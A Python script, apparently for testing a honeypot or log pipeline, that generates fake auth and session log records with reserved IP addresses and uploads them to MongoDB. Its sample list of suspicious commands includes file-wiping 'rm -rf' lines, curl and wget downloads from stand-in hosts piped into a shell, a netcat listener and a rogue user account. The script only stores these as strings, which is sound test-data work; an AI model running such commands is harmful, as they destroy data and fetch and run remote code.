import logging
import time
import random
import uuid
from datetime import datetime
from pymongo import MongoClient
from dotenv import load_dotenv
import os

load_dotenv()
logger = logging.getLogger(__name__)

# Define a list of suspicious commands
suspicious_commands = [
    "rm -rf /",
    "chmod 777 /etc/shadow",
    "wget http://malicious.com/malware.sh -O- | sh",
    "curl http://bad-site.com/attack | bash",
    "useradd -m hacker",
    "echo 'hacked' > /var/www/html/index.html",
    "sudo su",
    "nc -lvp 4444",
    "python -c 'import os; os.system(\"rm -rf *\")'",
    "rm -rf /home/user/*"
]

# Function to generate a random IP from reserved documentation ranges
def generate_ip():
    ranges = [(192, 0, 2), (198, 51, 100), (203, 0, 113)]
    base = random.choice(ranges)
    return f"{base[0]}.{base[1]}.{base[2]}.{random.randint(1,254)}"

# Function to generate a fake log record
def generate_fake_log(log_type):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    duration = random.randint(0, 60)
    session_id = str(uuid.uuid4())
    source_ip = generate_ip()
    destination_ip = generate_ip()
    source_port = random.randint(1000, 8000)
    destination_port = random.choice([50, 999])
    protocol = random.choice(["http", "https", "ssh"])
    failed = random.randint(10, 20)
    success = random.randint(0, 2)
    auth_attempts = {"failed": failed, "success": success}
    cmd = random.choice(suspicious_commands) if random.random() < 0.3 else ""
    commands = [cmd] if cmd else []
    return {
        "timestamp": timestamp,
        "duration": duration,
        "session_id": session_id,
        "source_ip": source_ip,
        "source_port": source_port,
        "destination_ip": destination_ip,
        "destination_port": destination_port,
        "protocol": protocol,
        "auth_attempts": auth_attempts,
        "commands": commands,
        "log_type": log_type
    }

def main():
    mongo_uri = os.getenv("MONGO_URI")
    if not mongo_uri:
        logger.critical("MONGO_URI not found in environment variables.")
        raise ValueError("MONGO_URI not found in environment variables.")
    try:
        client = MongoClient(mongo_uri)
        db = client[os.getenv("MONGO_DB", "Honey")]
        collection = db[os.getenv("MONGO_COLLECTION", "records")]
        logger.info("Connected to MongoDB at %s", mongo_uri)
    except Exception as e:
        logger.critical(f"Failed to connect to MongoDB: {e}")
        raise

    ITERATIONS = int(os.getenv("LOG_GEN_ITERATIONS", 10))
    BATCH_SIZE = int(os.getenv("LOG_GEN_BATCH_SIZE", 20))
    SLEEP_TIME = float(os.getenv("LOG_GEN_SLEEP_TIME", 0.5))

    for i in range(ITERATIONS):
        logger.info(f"Iteration {i+1}: Generating and uploading {BATCH_SIZE} logs...")
        batch = []
        for j in range(BATCH_SIZE):
            log_type = random.choice(["auth", "session"])
            log = generate_fake_log(log_type)
            batch.append(log)
        try:
            collection.insert_many(batch)
            logger.info("✅ Batch of logs uploaded successfully!")
        except Exception as e:
            logger.error(f"Error uploading logs: {e}")
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    main()



